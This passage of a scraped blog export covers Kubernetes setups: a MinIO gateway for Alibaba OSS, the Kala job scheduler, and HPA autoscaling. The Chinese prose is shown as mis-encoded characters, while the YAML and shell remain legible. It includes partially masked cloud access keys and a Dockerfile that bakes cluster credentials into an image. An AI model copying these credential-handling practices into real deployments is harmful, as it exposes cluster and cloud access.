labels: 7 app: minio 8spec: 9 replicas: 1 10 selector: 11 matchLabels: 12 app: minio 13 template: 14 metadata: 15 labels: 16 app: minio 17 spec: 18 containers: 19 - name: minio 20 image: registry.cn-shanghai.aliyuncs.com/rendoumi/minio:latest 21 ports: 22 - containerPort: 9000 23--- 24apiVersion: v1 25kind: Service 26metadata: 27 name: minio-svc 28 labels: 29 app: minio 30spec: 31 ports: 32 - name: http 33 protocol: TCP 34 port: 9000 35 targetPort: 9000 36 selector: 37 app: minio 38 type: ClusterIP ç„¶åå¼€è½¬å‘ï¼š\n1kubectl port-forward svc/minio-svc 9000:9000 \u0026amp; ç”¨æµè§ˆå™¨è®¿é—® http://localhost:9000 å°±å¯ä»¥äº†ï¼Œè¿˜å¾—è¾“å…¥ä¸€éå¯†ç \nè¿™æ ·å°±å¯ä»¥çœ‹åˆ° OSS çš„æ‰€æœ‰æ¡¶äº†\nMinioçš„å®˜æ–¹å‘½ä»¤è¡Œå®¢æˆ·ç«¯æ˜¯ mcï¼Œä½¿ç”¨æ–¹æ³•å¦‚ä¸‹ï¼š\n1wget https://dl.min.io/client/mc/release/linux-amd64/mc 2chmod 755 mc 3 4./mc alias set minio http://minio-svc:9000 MINIO_ACCESS_KEY å’Œ MINIO_SECRET_KEY 5 6./mc ls minio minio è·‘åœ¨å®¹å™¨å¤–è¿›è¡Œ OSS ä»£ç†çš„æ–¹æ³•ï¼Œæ³¨æ„ä¸åŒåœ°æ–¹ï¼ŒOSS çš„åŸŸåæ”¹ä¸ºå…¬ç½‘çš„äº†ï¼š\n1#!/bin/sh 2export MINIO_ACCESS_KEY=LTAI5tFFTbsxxxxxuLb 3export MINIO_SECRET_KEY=t78PyGnHZilxxxxxdxBCjvNgtVC5Y 4nohup ./minio.RELEASE.2020-04-15T19-42-18Z gateway oss http://oss-cn-shanghai.aliyuncs.com \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 \u0026amp; ","date":"2021-11-26","img":"","permalink":"https://rendoumi.com/posts/20211126-kubernetes_minio_oss_gateway/","series":null,"tags":null,"title":"Kubernetesæ­å»ºminioä½œä¸ºé˜¿é‡ŒOSSçš„Gateway"},{"categories":null,"content":"æœ¬æ¥ k8s çš„ crontab æ˜¯å¯åŠ¨ä¸€ä¸ªå®¹å™¨æ¥è¿è¡Œçš„ï¼Œå¾ˆç®€å•ï¼Œå¦‚ä¸‹ï¼š\n1apiVersion: batch/v1beta1 2kind: CronJob 3metadata: 4 name: curl-cron 5spec: 6 schedule: \u0026#34;*/1 * * * *\u0026#34; 7 jobTemplate: 8 spec: 9 template: 10 spec: 11 containers: 12 - name: curl-cron 13 image: radial/busyboxplus:curl 14 imagePullPolicy: IfNotPresent 15 command: 16 - /bin/sh 17 - -c 18 - date;echo \u0026#34;run crontab\u0026#34;;curl http://www.baidu.com 19 restartPolicy: OnFailure 20 successfulJobsHistoryLimit: 2 21 failedJobsHistoryLimit: 2 ä¸Šé¢å°±è·‘äº†ä¸€ä¸ª busybox çš„ podï¼Œæ¯åˆ†é’Ÿå»è®¿é—®ç™¾åº¦ï¼Œç„¶ååœ¨ stdout è¾“å‡ºç»“æœ\nè¿™ä¸ªæ²¡ä»€ä¹ˆï¼Œæ³¨æ„ä¸Šé¢æ–‡ä»¶çš„æœ€åä¸¤è¡Œã€‚é™åˆ¶æˆåŠŸä»¥åŠå¤±è´¥ job çš„ History æ•°é‡ï¼Œå¦‚æœä¸åŠ é™åˆ¶ï¼Œkubectl get pods ä¼šçœ‹åˆ°æ— ç©·æ— å°½çš„completed çŠ¶æ€çš„ curl-cron podã€‚\nåˆ†å‰²çº¿ï¼Œéƒ¨ç½² crontab çš„ yaml å¾ˆç®€å•ã€‚ä½†æ˜¯ï¼Œç°åœ¨äº§å“éƒ¨æœ‰ä¸ªéœ€æ±‚ï¼Œä»–ä»¬è¦åœ¨æŸä¸€å¤©è¿›è¡Œä¿ƒé”€æ´»åŠ¨ï¼Œå¤§æ¦‚2å¤©ï¼ŒæœŸé—´ä¼šæµé‡å¤§å¢ï¼Œäºæ˜¯æƒ³åº”ç”¨ hpa æ¥ä¼¸ç¼© podï¼Œæ´»åŠ¨ç»“æŸåå…³é—­ hpaã€‚ä¹‹åä»–ä»¬è¿˜ä¼šæœ‰ä¸æ–­çš„ä¿ƒé”€ï¼Œç ”å‘ä¸çŸ¥é“ä»€ä¹ˆæ—¶å€™å¼€å§‹ï¼Œä»€ä¹ˆæ—¶å€™ç»“æŸï¼›ä½†æ˜¯ç ”å‘åˆä¸æƒ³äº§å“éƒ¨çœ‹åˆ° yamlï¼Œå¹¶ä¸”éšæ—¶é…åˆéƒ¨ç½² hpaã€‚\nè¿˜æœ‰ä¸ªé—®é¢˜ï¼Œå¦‚æœç”¨crontabï¼Œé‚£ä¹ˆæ´»åŠ¨å¼€å§‹è¿è¡Œä¸€æ¬¡ï¼Œæ´»åŠ¨ç»“æŸä¸€æ¬¡ï¼Œæœ€åç ”å‘è¿˜å¾—æ¸…ç†åˆ é™¤æ‰è¿™ä¸¤ä¸ª crontab æ¥æ¢å¤æ­£å¸¸ã€‚\nè¿™ä¸‹éº»çƒ¦äº†ï¼Œæœ‰ä»€ä¹ˆé¡µé¢ç®¡ç† crontab çš„ç¥å™¨ï¼Œèƒ½è®©äº§å“éƒ¨è‡ªå·±è¿è¡Œï¼Œç„¶åæƒé™åˆ†ç¦»ï¼Œè€Œä¸”èƒ½æŒ‡å®šå†æœªæ¥çš„æŸå¤©è¿è¡Œä¸€æ¬¡æˆ–å¤šæ¬¡ï¼Œä¸”ä¸ç”¨æ‰‹å·¥æ¸…ç†å°±å¥½äº†ã€‚\nè¿˜çœŸçš„æœ‰ä¸€ä¸ªï¼Œkala å°±æ˜¯äº†ï¼ï¼ï¼\nKala æ˜¯ä¸€ä¸ªcronç®¡ç†é…ç½®å·¥å…·ï¼Œé¡¹ç›®åœ°å€ï¼š\nhttps://github.com/ajvb/kala å¡æ‹‰æ˜¯åŸºäº Airbnb çš„ Chronos ç¿»å†™çš„ Go ç¨‹åºã€‚\nå®ƒæ¯” crontab æ›´å¥½ä¸€äº›çš„æ˜¯ï¼Œå¯ä»¥æŒ‡å®šæœªæ¥æŸå¤©çš„ä¸€æ¬¡æ€§æ‰§è¡Œä»»åŠ¡ï¼Œæœ‰ä¸ªä½¿ç”¨ç•Œé¢\nKala å¯ä»¥æ‰§è¡Œæœ¬åœ°çš„å‘½ä»¤ï¼Œä¹Ÿå¯ä»¥å‘èµ· http çš„è¯·æ±‚ã€‚\næ³¨æ„ï¼Œkala çš„æºä»£ç é‡Œæœ‰ä¸€ä¸ªåœ°æ–¹éœ€è¦ä¿®æ”¹ï¼Œå¦åˆ™å‚æ•°bolt-pathä¸ç”Ÿæ•ˆï¼Œæˆ‘ä»¬æ”¹æ‰å®ƒè‡ªå·±ç¼–è¯‘ä¸ª2è¿›åˆ¶ç¨‹åºå‡ºæ¥ã€‚\n1Modify cmd/server.go 2 3switch viper.GetString(\u0026#34;jobdb\u0026#34;) { 4case \u0026#34;boltdb\u0026#34;: 5db = boltdb.GetBoltDB(viper.GetString(\u0026#34;boltpath\u0026#34;)) 6 7Change to 8db = boltdb.GetBoltDB(viper.GetString(\u0026#34;bolt-path\u0026#34;)) 9 10Run it : 11./kala serve --jobdb=boltdb --bolt-path=/data/db æˆ‘ä»¬ç”¨ Dockerfile é€ ä¸€ä¸ªé•œåƒå‡ºæ¥ï¼š\n1FROM alpine:3.12 2RUN apk add --update bash \u0026amp;\u0026amp; rm -rf /var/cache/apk/* 3 4COPY . /data/ 5 6RUN mkdir /lib64 \u0026amp;\u0026amp; \\ 7 ln -s /lib/libc.musl-x86_64.so.1 /lib64/ld-linux-x86-64.so.2 \u0026amp;\u0026amp; \\ 8 mv /data/kubectl /bin \u0026amp;\u0026amp; \\ 9 mv /data/.kube /root \u0026amp;\u0026amp; \\ 10 rm -rf /data/Dockerfile 11 12WORKDIR /data 13EXPOSE 8000 14 15CMD [\u0026#34;/data/kala\u0026#34;, \u0026#34;serve\u0026#34;,\u0026#34;--jobdb=boltdb\u0026#34;,\u0026#34;--bolt-path=/data/db\u0026#34;] 16#CMD /bin/sh -c \u0026#34;while true; do echo hi; sleep 10; done\u0026#34; æ³¨æ„ä¸Šé¢æˆ‘ä»¬æŠŠ kubectl å’Œ .kube é…ç½®ä¸€èµ·æ”¾è¿›äº†é•œåƒï¼Œå½“ç„¶ä¸€äº› yaml å’Œè„šæœ¬ä¹Ÿå¯ä»¥éƒ½æ‰“è¿›å»ï¼Œç„¶åæ¨åˆ°é˜¿é‡Œäº‘é•œåƒä»“åº“å»ï¼ˆæ³¨æ„å®‰å…¨é—®é¢˜ï¼‰ã€‚\nå¤‡æ³¨ ï¼škalaé»˜è®¤çš„ç«¯å£æ˜¯8000ï¼Œè®¿é—® url æ˜¯ /webui\nç„¶åæˆ‘ä»¬ç”Ÿæˆä¸€ä¸ª secret æ”¾è¿› k8s\n1htpasswd -c auth kala-auth 2New password: 3Re-type new password: 4Adding password for user kala 5 6kubectl create secret generic kala-auth --from-file=kala-auth 7secret \u0026#34;kala-auth\u0026#34; created 8 9kubectl get secret kala-auth -o yaml ç„¶åæˆ‘ä»¬å®šä¹‰ä¸€ç³»åˆ—çš„èµ„æºæ–‡ä»¶ï¼ŒDeploymentã€SVCã€Ingressï¼Œå…¶ä¸­ ingress å¼•ç”¨äº† kala-auth çš„ secretï¼Œå¹¶ä¸”æŒ‡å®šäº† app-root æ˜¯ /webui/ã€‚\nå¦å¤– kala ä½¿ç”¨äº† k8s-kala-5g çš„æŒä¹…åŒ–å·ï¼ŒåŠ¡å¿…äº‹å…ˆå‡†å¤‡å¥½ pv å’Œ pvcï¼Œä¸æŒä¹…åŒ–çš„è¯ pod ä¸€é‡å¯ï¼Œä¹‹å‰ä¿å­˜çš„é…ç½®ä¿¡æ¯å°±å…¨æ²¡äº†ã€‚\n1--- 2apiVersion: apps/v1 3kind: Deployment 4metadata: 5 name: kala-deploy 6 labels: 7 app: kala 8spec: 9 replicas: 1 10 selector: 11 matchLabels: 12 app: kala 13 template: 14 metadata: 15 labels: 16 app: kala 17 spec: 18 containers: 19 - name: kala 20 image: registry.cn-shanghai.aliyun.com/xxx/kala:latest 21 imagePullPolicy: Always 22 ports: 23 - containerPort: 8000 24 volumeMounts: 25 - mountPath: /data/db 26 name: kala-data 27 volumes: 28 - name: kala-data 29 persistentVolumeClaim: 30 claimName: k8s-kala-5g 31--- 32apiVersion: v1 33kind: Service 34metadata: 35 name: kala-svc 36 labels: 37 app: kala 38spec: 39 ports: 40 - name: http 41 protocol: TCP 42 port: 8000 43 targetPort: 8000 44 selector: 45 app: kala 46 type: ClusterIP 47--- 48apiVersion: networking.k8s.io/v1beta1 49kind: Ingress 50metadata: 51 name: kala-com-ingress 52 annotations: 53 kubernetes.io/ingress.class: nginx 54 nginx.ingress.kubernetes.io/block-cidrs: 111.201.134.93/32 55 nginx.ingress.kubernetes.io/auth-type: basic 56 nginx.ingress.kubernetes.io/auth-secret: kala-auth 57 nginx.ingress.kubernetes.io/auth-realm: \u0026#39;Authentication Required - Kala\u0026#39; 58 nginx.ingress.kubernetes.io/app-root: \u0026#39;/webui/\u0026#39; 59spec: 60 rules: 61 - host: kala.rendoumi.com 62 http: 63 paths: 64 - path: / 65 backend: 66 serviceName: kala-svc 67 servicePort: 80 è¿™æ · kala å°±å¯ä»¥ä»å…¬ç½‘è®¿é—®äº†ï¼Œhttp://kala.rendoumi.com:8000/ ï¼Œä¸”éœ€è¦æä¾›å¯†ç æ‰èƒ½è¿›å…¥ã€‚\nä¸‹é¢è¯´ä¸€ä¸‹å…·ä½“çš„ç”¨æ³•ï¼Œè¿˜æ˜¯æœ‰ä¸€äº›æŠ€å·§æ€§çš„ï¼Œç™»å½•è¿›å»åçš„é¡µé¢ï¼š\nè¿›å…¥åå·¦ä¸Šè§’ç‚¹å‡» Create å»ºç«‹æ–°ä»»åŠ¡\nè¦å¡«å†™å†…å®¹å¦‚ä¸‹ï¼š\nJob nameï¼šèµ·ä¸ªåå­—ï¼Œå«ï¼šå¢å¤§HPA\nCommandï¼šè¦è¿è¡Œçš„è„šæœ¬ï¼š/data/resize.sh 35 (å›ºå®šæ‰©å¤§ECIçš„è„šæœ¬)\nScheduleï¼šR0/2021-07-07T06:00:00+08:00/PT0S\nâ€‹ è¿™ä¸ªæœ€é‡è¦\nâ€‹ è¿™è¡Œçš„æ ¼å¼æ˜¯è¿™æ ·çš„ï¼šNumber of times to repeat/Start Datetime/Interval Between Runs\nâ€‹ R0 é‡å¤0æ¬¡ï¼Œå³åªæ‰§è¡Œä¸€æ¬¡ï¼Œä¸é‡å¤\nâ€‹ 2021-07-06T06:00:00+8:00 æ—¶é—´æˆ³ï¼Œæ³¨æ„æ—¶åŒºä¸­å›½+8:00\nâ€‹ PT0S æ— å»¶è¿Ÿ0Så¯åŠ¨\nâ€‹ åˆèµ·æ¥å°±æ˜¯\nâ€‹ R0/2021-07-07T06:00:00+08:00/PT0S å°±æ˜¯åœ¨2021å¹´7æœˆ7æ—¥ä¸­å›½æ—¶é—´6ç‚¹æ— ä»»ä½•å»¶è¿Ÿæ‰§è¡Œä¸€æ¬¡è„šæœ¬ resize.sh\nReset Form è¿™ä¸ªä¸€å®šè¦é€‰æ‰ï¼Œä¿æŒç©ºï¼Œå¦åˆ™ä¸‹æ¬¡è¿›æ¥ä¸Šæ¬¡çš„æ•°æ®éƒ½æ²¡äº†ï¼Œè¿˜å¾—æ‰‹åŠ¨è¾“å…¥ï¼Œéº»çƒ¦ å…¶ä»–éƒ½ä¸å¡«å†™ï¼Œç„¶å Create å°±è¡Œäº†\nç„¶åæˆ‘ä»¬å¯ä»¥å†å»ºä¸€ä¸ªæ¢å¤çš„ä»»åŠ¡\næˆ‘ä»¬å»ç•Œé¢å°±å¯ä»¥çœ‹åˆ°å¤šäº†ä¸¤ä¸ªä»»åŠ¡ï¼Œå¢å¤§HPAå’Œæ¢å¤HPAï¼Œè¿™æ ·å°± OK äº†\næ³¨æ„ï¼šJOBä¸€æ—¦å»ºç«‹ï¼Œä»¥åå°±å¯ä»¥ç›´æ¥ä»ç•Œé¢ä¸Šæ‰‹åŠ¨æ‰§è¡Œï¼ŒRun Manually\nè¿™ä¸œè¥¿çœŸæ˜¯ä¸ªç¥å™¨ï¼Œäº§å“éƒ¨çš„åŒäº‹å¯ä»¥éšæ—¶ä¿®æ”¹hpaå’Œæ¢å¤ï¼Œè€Œä¸ç”¨é€šè¿‡ç ”å‘éƒ¨äº†ï¼Œå–„è«å¤§ç„‰ã€‚\n","date":"2021-11-25","img":"","permalink":"https://rendoumi.com/posts/20211125-kubernetes_crontab_kala/","series":null,"tags":null,"title":"æ›¿ä»£kubernetes Crontabçš„ç¥å™¨kala"},{"categories":null,"content":"kubernetes çš„åŠ¨æ€ä¼¸ç¼© HPA æ˜¯éå¸¸æœ‰ç”¨çš„ç‰¹æ€§ã€‚\næˆ‘ä»¬çš„æœåŠ¡å™¨æ‰˜ç®¡åœ¨é˜¿é‡Œäº‘çš„ ACK ä¸Šï¼Œk8s æ ¹æ® cpu æˆ–è€… å†…å­˜çš„ä½¿ç”¨æƒ…å†µï¼Œä¼šè‡ªåŠ¨ä¼¸ç¼©å…³é”® pod çš„æ•°é‡ï¼Œä»¥åº”å¯¹å¤§æµé‡çš„æƒ…å½¢ã€‚è€Œä¸”æ›´å¦™çš„æ˜¯ï¼ŒåŠ¨æ€æ‰©å±•çš„ pod å¹¶ä¸æ˜¯ä½¿ç”¨è‡ªå·±çš„å›ºå®šæœåŠ¡å™¨ï¼Œè€Œæ˜¯ä½¿ç”¨é˜¿é‡ŒåŠ¨æ€çš„ ECI è™šæ‹ŸèŠ‚ç‚¹æœåŠ¡å™¨ï¼Œè¿™æ ·å°±çœŸçš„æ˜¯å³å¼€å³ç”¨ï¼Œç”¨å®Œå³æ¯ã€‚æœ‰å¤šå¤§æµé‡ä»˜å¤šå°‘é’±ï¼Œç‰©å°½å…¶ç”¨ã€‚\næˆ‘ä»¬å…ˆæ˜ç¡®ä¸€ä¸‹æ¦‚å¿µï¼š\nk8s çš„èµ„æºæŒ‡æ ‡è·å–æ˜¯é€šè¿‡ api æ¥å£æ¥è·å¾—çš„ï¼Œæœ‰ä¸¤ç§ apiï¼Œä¸€ç§æ˜¯æ ¸å¿ƒæŒ‡æ ‡ï¼Œä¸€ç§æ˜¯è‡ªå®šä¹‰æŒ‡æ ‡ã€‚\næ ¸å¿ƒæŒ‡æ ‡ï¼šCore metricsï¼Œç”±metrics-serveræä¾›APIï¼Œå³ metrics.k8s.ioï¼Œä»…æä¾›Nodeå’ŒPodçš„CPUå’Œå†…å­˜ä½¿ç”¨æƒ…å†µã€‚api æ˜¯ metrics.k8s.io\nè‡ªå®šä¹‰æŒ‡æ ‡ï¼šCustom Metricsï¼Œç”±Prometheus Adapteræä¾›APIï¼Œå³ custom.metrics.k8s.ioï¼Œç”±æ­¤å¯æ”¯æŒä»»æ„Prometheusé‡‡é›†åˆ°çš„è‡ªå®šä¹‰æŒ‡æ ‡ã€‚api æ˜¯ custom.metrics.k8s.io å’Œ external.metrics.k8s.io\nä¸€ã€æ ¸å¿ƒæŒ‡æ ‡metrics-server é˜¿é‡Œçš„ ACK ç¼ºçœæ˜¯è£…äº† metrics-server çš„ï¼Œçœ‹ä¸€ä¸‹ï¼Œç³»ç»Ÿé‡Œæœ‰ä¸€ä¸ªmetrics-server\n1kubectl get pods -n kube-system å†çœ‹çœ‹ api çš„æ ¸å¿ƒæŒ‡æ ‡èƒ½æ‹¿åˆ°ä»€ä¹ˆï¼Œå…ˆçœ‹ Node çš„æŒ‡æ ‡ï¼š\n1kubectl get --raw \u0026#34;/apis/metrics.k8s.io\u0026#34; | jq . 2kubectl get --raw \u0026#34;/apis/metrics.k8s.io/v1beta1\u0026#34; | jq . 3kubectl get --raw \u0026#34;/apis/metrics.k8s.io/v1beta1/nodes\u0026#34; | jq . å¯ä»¥çœ‹åˆ°é˜¿é‡Œ eci è™šæ‹ŸèŠ‚ç‚¹çš„ cpu å’Œ memory èµ„æºã€‚\nå†çœ‹çœ‹ Pod çš„æŒ‡æ ‡ï¼š\n1kubectl get --raw \u0026#34;/apis/metrics.k8s.io/v1beta1/pods\u0026#34; | jq . å¯ä»¥æ¸…æ¥šå¾—çœ‹åˆ°è°ƒåº¦åˆ°è™šæ‹ŸèŠ‚ç‚¹ä¸Šçš„ Pod çš„ cpu å’Œ memory èµ„æºä½¿ç”¨æƒ…å†µã€‚å¤§å®¶çœ‹åˆ°åªæœ‰ cpu å’Œ memoryï¼Œè¿™å°±å¤Ÿäº†ã€‚\nç»™ä¸ªå…¨éƒ¨ä½¿ç”¨è‡ªå·± Work Node å®ä½“èŠ‚ç‚¹ä¼¸ç¼©çš„ä¾‹å­ï¼š\nphp-hpa.yaml (è¿™é‡Œå®šä¹‰äº†å¹³å‡cpuä½¿ç”¨åˆ°è¾¾80%æˆ–è€…å†…å­˜å¹³å‡ä½¿ç”¨åˆ°200Må°±ä¼¸ç¼©ï¼‰ï¼š\nphp-hpa è§„èŒƒäº† php-deploy å¦‚ä½•ä¼¸ç¼©ï¼Œæœ€å°2ï¼Œæœ€å¤§10ï¼š\n1apiVersion: autoscaling/v2beta1 2kind: HorizontalPodAutoscaler 3metadata: 4 name: php-hpa 5 namespace: default 6spec: 7 scaleTargetRef: 8 apiVersion: extensions/v1beta1 9 kind: Deployment 10 name: php-deploy 11 minReplicas: 2 12 maxReplicas: 10 13 metrics: 14 - type: Resource 15 resource: 16 name: cpu 17 targetAverageUtilization: 80 18 - type: Resource 19 resource: 20 name: memory 21 targetAverageValue: 200Mi å†ç»™ä¸ªé˜¿é‡Œ ACK ä½¿ç”¨ ECI è™šæ‹ŸèŠ‚ç‚¹ä¼¸ç¼©çš„ä¾‹å­ï¼š\næˆ‘ä»¬é¦–å…ˆå®šä¹‰ä¸€ä¸ªæ­£å¸¸çš„ deployment ï¼Œphp-deployï¼Œè¿™ä¸ªå°±æ­£å¸¸å®šä¹‰è·Ÿåˆ«çš„æ²¡åŒºåˆ«ã€‚\nç„¶åå†å®šä¹‰æ‰©å±•åˆ° eci èŠ‚ç‚¹çš„ ElasticWorloadï¼Œelastic-phpï¼Œè¿™ä¸ªç”¨æ¥æ§åˆ¶ php-deploy æ‹“å±•åˆ° eci è™šæ‹ŸèŠ‚ç‚¹å»\nä¸‹é¢æ˜¯å›ºå®š6ä¸ªï¼ŒåŠ¨æ€24ä¸ªï¼Œåˆè®¡30ä¸ª\n1apiVersion: autoscaling.alibabacloud.com/v1beta1 2kind: ElasticWorkload 3metadata: 4 name: elastic-php 5spec: 6 sourceTarget: 7 name: php-deploy 8 kind: Deployment 9 apiVersion: apps/v1 10 min: 0 11 max: 6 12 elasticUnit: 13 - name: virtual-kubelet 14 labels: 15 virtual-kubelet: \u0026#34;true\u0026#34; 16 alibabacloud.com/eci: \u0026#34;true\u0026#34; 17 annotations: 18 virtual-kubelet: \u0026#34;true\u0026#34; 19 nodeSelector: 20 type: \u0026#34;virtual-kubelet\u0026#34; 21 tolerations: 22 - key: \u0026#34;virtual-kubelet.io/provider\u0026#34; 23 operator: \u0026#34;Exists\u0026#34; 24 min: 0 25 max: 24 26 replicas: 30 ç„¶åå®šä¹‰ HPA php-hpa æ¥æ§åˆ¶ elastic-php çš„è‡ªåŠ¨ä¼¸ç¼©\n1apiVersion: autoscaling/v2beta2 2kind: HorizontalPodAutoscaler 3metadata: 4 name: php-hpa 5 namespace: default 6spec: 7 scaleTargetRef: 8 apiVersion: autoscaling.alibabacloud.com/v1beta1 9 kind: ElasticWorkload 10 name: elastic-php 11 minReplicas: 6 12 maxReplicas: 30 13 metrics: 14 - type: Resource 15 resource: 16 name: cpu 17 target: 18 type: Utilization 19 averageUtilization: 90 20 behavior: 21 scaleUp: 22 policies: 23 #- type: percent 24 # value: 500% 25 - type: Pods 26 value: 5 27 periodSeconds: 180 28 scaleDown: 29 policies: 30 - type: Pods 31 value: 1 32 periodSeconds: 600 ä¸Šé¢çš„ ElasticWorkload éœ€è¦ä»”ç»†è§£é‡Šä¸€ä¸‹ï¼Œphp-deploy å®šä¹‰çš„ pod å‰¯æœ¬å›ºå®šæ˜¯6ä¸ªï¼Œè¿™6ä¸ªéƒ½æ˜¯åœ¨æˆ‘ä»¬è‡ªå·±èŠ‚ç‚¹ä¸Šä¸ç”¨å†ä»˜è´¹ï¼Œç„¶å ECI çš„ pod å‰¯æœ¬æ•°æ˜¯0ä¸ªåˆ°24ä¸ªï¼Œé‚£ä¹ˆæ€»ä½“podæ•°é‡å°±æ˜¯ 6+24 = 30 ä¸ªï¼Œå…¶ä¸­ 24ä¸ªæ˜¯å¯ä»¥åœ¨è™šæ‹ŸèŠ‚ç‚¹ä¸Šä¼¸ç¼©çš„ã€‚è€Œ php-hpa å®šä¹‰äº†ä¼¸ç¼©èŒƒå›´æ˜¯ 6-30ï¼Œé‚£å°±æ„å‘³ç€å¹³æ—¶æµé‡å°çš„æ—¶å€™ç”¨çš„éƒ½æ˜¯è‡ªå·±æœåŠ¡å™¨ä¸Šé‚£6ä¸ªå›ºå®š podï¼Œå¦‚æœæµé‡å¤§äº†ï¼Œå°±ä¼šæ‰©å¤§åˆ° eci è™šæ‹ŸèŠ‚ç‚¹ä¸Šï¼Œè™šæ‹ŸèŠ‚ç‚¹æœ€å¤§é‡æ˜¯24ä¸ªï¼Œå¦‚æœæµé‡é™ä¸‹æ¥äº†ï¼Œå°±ä¼šç¼©å›å»ï¼Œç¼©åˆ°è‡ªå·±æœåŠ¡å™¨çš„6ä¸ªpod ä¸Šå»ã€‚è¿™æ ·å¯ä»¥ç²¾ç¡®æ§åˆ¶æˆæœ¬ã€‚\nphp-hpa å®šä¹‰çš„æœ€ä¸‹é¢ï¼Œæ‰©å¤§çš„æ—¶å€™å¦‚æœ cpu åˆ°äº† 90%ï¼Œé‚£ä¹ˆä¸€æ¬¡æ€§æ‰©å¤§5ä¸ªpodï¼Œç¼©å°çš„æ—¶å€™ä¸€ä¸ªä¸€ä¸ªç¼©ï¼Œè¿™æ ·é¿å…å¸¦æ¥æµé‡çš„æ¯›åˆºã€‚\näºŒã€è‡ªå®šä¹‰æŒ‡æ ‡Prometheus å¦‚ä¸Šå…¶å®å·²ç»å¯ä»¥æ»¡è¶³å¤§å¤šæ•°è¦æ±‚äº†ï¼Œä½†æ˜¯æƒ³æ›´è¿›ä¸€æ­¥ï¼Œæ¯”å¦‚æƒ³ä» Prometheus æ‹¿åˆ°çš„æŒ‡æ ‡æ¥è¿›è¡Œ hpa ä¼¸ç¼©ã€‚\né‚£å°±æ¯”è¾ƒéº»çƒ¦äº†\nçœ‹ä¸Šå›¾ï¼ŒPrometheus Operator é€šè¿‡ http æ‹‰å– pod çš„ metric æŒ‡æ ‡ï¼ŒPrometheus Adaptor å†æ‹‰å– Prometheus Operator å­˜å‚¨çš„æ•°æ®å¹¶ä¸”æš´éœ²ç»™ Custom API ä½¿ç”¨ã€‚ä¸ºå•¥è¦å¼„è¿™äºŒä¸ªä¸œè¥¿å‘¢ï¼Ÿå› ä¸º Prometheus é‡‡é›†åˆ°çš„ metrics æ•°æ®å¹¶ä¸èƒ½ç›´æ¥ç»™ k8s ç”¨ï¼Œå› ä¸ºä¸¤è€…æ•°æ®æ ¼å¼ä¸å…¼å®¹ï¼Œè¿˜éœ€è¦å¦å¤–ä¸€ä¸ªç»„ä»¶(kube-state-metrics)ï¼Œå°†prometheus çš„ metrics æ•°æ®æ ¼å¼è½¬æ¢æˆ k8s API æ¥å£èƒ½è¯†åˆ«çš„æ ¼å¼ï¼Œè½¬æ¢ä»¥åï¼Œå› ä¸ºæ˜¯è‡ªå®šä¹‰APIï¼Œæ‰€ä»¥è¿˜éœ€è¦ç”¨ Kubernetes aggregator åœ¨ä¸» API æœåŠ¡å™¨ä¸­æ³¨å†Œï¼Œä»¥ä¾¿å…¶ä»–ç¨‹åºç›´æ¥é€šè¿‡ /apis/ æ¥è®¿é—®ã€‚\næˆ‘ä»¬é¦–å…ˆæ¥çœ‹çœ‹å¦‚ä½•å®‰è£…è¿™äºŒä¸ªä¸œè¥¿ï¼š\né¦–å…ˆè£… Prometheus Operatorï¼Œè¿™å®¶ä¼™ä¼šè‡ªåŠ¨è£…ä¸€æ†ä¸œè¥¿ï¼Œ Pormetheusã€Grafanaã€Alert managerç­‰ï¼Œæ‰€ä»¥æœ€å¥½ç»™å®ƒå•ç‹¬å¼„ä¸€ä¸ªå‘½åç©ºé—´\nprometheus-operator prometheus alertmanager node-exporter kube-state-metrics grafana 1#å®‰è£… 2helm install --name prometheus --namespace monitoring stable/prometheus-operator 3 4#å¼€ä¸ªç«¯å£æœ¬åœ°è®¿é—® prometheus çš„é¢æ¿ï¼Œcurl http://localhost:9090 5kubectl port-forward --namespace monitoring svc/prometheus-operator-prometheus 9090:9090 6 7 8#çœ‹çœ‹éƒ½æœ‰ä»€ä¹ˆpod 9kubectl get pod -n monitoring 10NAME READY STATUS RESTARTS AGE 11pod/alertmanager-prometheus-operator-alertmanager-0 2/2 Running 0 98m 12pod/prometheus-operator-grafana-857dfc5fc8-vdnff 2/2 Running 0 99m 13pod/prometheus-operator-kube-state-metrics-66b4c95cd9-mz8nt 1/1 Running 0 99m 14pod/prometheus-operator-operator-56964458-8sspk 2/2 Running 0 99m 15pod/prometheus-operator-prometheus-node-exporter-dcf5p 1/1 Running 0 99m 16pod/prometheus-operator-prometheus-node-exporter-nv6ph 1/1 Running 0 99m 17pod/prometheus-prometheus-operator-prometheus-0 3/3 Running 1 98m 18 19#çœ‹çœ‹éƒ½æœ‰ä»€ä¹ˆsvc 20kubectl get svc -n monitoring 21NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE 22alertmanager-operated ClusterIP None \u0026lt;none\u0026gt; 9093/TCP,9094/TCP,9094/UDP 100m 23prometheus-operated ClusterIP None \u0026lt;none\u0026gt; 9090/TCP 100m 24prometheus-operator-alertmanager NodePort 10.1.238.78 \u0026lt;none\u0026gt; 9093:31765/TCP 102m 25prometheus-operator-grafana NodePort 10.1.125.228 \u0026lt;none\u0026gt; 80:30284/TCP 102m 26prometheus-operator-kube-state-metrics ClusterIP 10.1.187.129 \u0026lt;none\u0026gt; 8080/TCP 102m 27prometheus-operator-operator ClusterIP 10.1.242.61 \u0026lt;none\u0026gt; 8080/TCP,443/TCP 102m 28prometheus-operator-prometheus NodePort 10.1.156.181 \u0026lt;none\u0026gt; 9090:30268/TCP 102m 29prometheus-operator-prometheus-node-exporter ClusterIP 10.1.226.134 \u0026lt;none\u0026gt; 9100/TCP 102m æˆ‘ä»¬çœ‹åˆ°æœ‰ prometheus-operated è¿™ä¸ªClusterIP svcï¼Œæ³¨æ„ k8s çš„ coredns åŸŸåè§£ææ–¹å¼ï¼Œé›†ç¾¤çš„å†…éƒ¨åŸŸåæ˜¯ hbb.localï¼Œé‚£ä¹ˆè¿™ä¸ª svc çš„å…¨ hostname å°±æ˜¯ prometheus-operated.monitoring.svc.hbb.localï¼Œé›†ç¾¤ä¸­å¯ä»¥å–èˆåˆ° prometheus-operated.monitoring æˆ–è€… prometheus-operated.monitoring.svc æ¥è®¿é—®ã€‚\nç„¶åå†è£… Prometheus Adaptorï¼Œæˆ‘ä»¬è¦æ ¹æ®ä¸Šé¢çš„å…·ä½“æƒ…å†µæ¥è®¾ç½® prometheus.urlï¼š\n1helm install --name prometheus-adapter stable/prometheus-adapter --set prometheus.url=\u0026#34;http://prometheus-operated.monitoring.svc\u0026#34;,prometheus.port=\u0026#34;9090\u0026#34; --set image.tag=\u0026#34;v0.4.1\u0026#34; --set 